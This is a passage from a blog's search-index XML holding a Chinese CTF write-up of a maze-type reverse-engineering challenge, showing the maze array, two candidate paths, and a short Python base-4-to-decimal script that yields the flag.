class="number">0</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,</span><br><span class="line"><span class="number">0</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">0</span>,</span><br><span class="line"><span class="number">0</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">0</span>,</span><br><span class="line"><span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>,</span><br><span class="line"><span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,</span><br><span class="line"><span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,</span><br><span class="line"><span class="number">0</span>,<span class="number">1</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,</span><br><span class="line"><span class="number">0</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,</span><br><span class="line"><span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,</span><br><span class="line"><span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,</span><br><span class="line"><span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span></span><br></pre></td></tr></table></figure><p>下面看一下 sub_400670 函数 ，结合动调，是十进制转四进制算法。<br /><img src="https://cdn.jsdelivr.net/gh/1ens/blogImages/imgs/202205082342374.png" class="lazyload" data-srcset="https://cdn.jsdelivr.net/gh/1ens/blogImages/imgs/202205082342374.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw=="><br />下面就是迷宫出走方式<br /><img src="https://cdn.jsdelivr.net/gh/1ens/blogImages/imgs/202205082342140.png" class="lazyload" data-srcset="https://cdn.jsdelivr.net/gh/1ens/blogImages/imgs/202205082342140.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw=="><br />得到两条路径，根据函数判断路径长度是45，所以是上面那条<br />232222322330030000303322223333333222233333333<br />232222322330030000303322222222222333333300033333333<br />然后四进制转十进制得到flag</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">def <span class="title">anyToDecimal</span><span class="params">(num,n)</span>:</span></span><br><span class="line"><span class="function">   baseStr =</span> &#123;<span class="string">&quot;0&quot;</span>:<span class="number">0</span>,<span class="string">&quot;1&quot;</span>:<span class="number">1</span>,<span class="string">&quot;2&quot;</span>:<span class="number">2</span>,<span class="string">&quot;3&quot;</span>:<span class="number">3</span>,<span class="string">&quot;4&quot;</span>:<span class="number">4</span>,<span class="string">&quot;5&quot;</span>:<span class="number">5</span>,<span class="string">&quot;6&quot;</span>:<span class="number">6</span>,<span class="string">&quot;7&quot;</span>:<span class="number">7</span>,<span class="string">&quot;8&quot;</span>:<span class="number">8</span>,<span class="string">&quot;9&quot;</span>:<span class="number">9</span>,</span><br><span class="line">              <span class="string">&quot;a&quot;</span>:<span class="number">10</span>,<span class="string">&quot;b&quot;</span>:<span class="number">11</span>,<span class="string">&quot;c&quot;</span>:<span class="number">12</span>,<span class="string">&quot;d&quot;</span>:<span class="number">13</span>,<span class="string">&quot;e&quot;</span>:<span class="number">14</span>,<span class="string">&quot;f&quot;</span>:<span class="number">15</span>,<span class="string">&quot;g&quot;</span>:<span class="number">16</span>,<span class="string">&quot;h&quot;</span>:<span class="number">17</span>,<span class="string">&quot;i&quot;</span>:<span class="number">18</span>,<span class="string">&quot;j&quot;</span>:<span class="number">19</span>&#125;</span><br><span class="line">   new_num = <span class="number">0</span></span><br><span class="line">   nNum = <span class="built_in">len</span>(num) - <span class="number">1</span></span><br><span class="line">   <span class="keyword">for</span> i in num:</span><br><span class="line">       new_num = new_num  + baseStr[i]*<span class="built_in">pow</span>(n,nNum)</span><br><span class="line">       nNum = nNum <span class="number">-1</span></span><br><span class="line">   <span class="built_in">print</span>(new_num)</span><br><span class="line"></span><br><span class="line"><span class="built_in">anyToDecimal</span>(<span class="string">&#x27;232222322330030000303322223333333222233333333&#x27;</span>, <span class="number">4</span>)</span><br></pre></td></tr></table></figure><p> flag{902741462666576198076399615}</p>]]></content>
      
      
      <categories>
          
          <category> WP </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 迷宫 </tag>
            
            <tag> 进制 </tag>
            
        </tags>
      
    </entry>
    
    
  
  
</search>
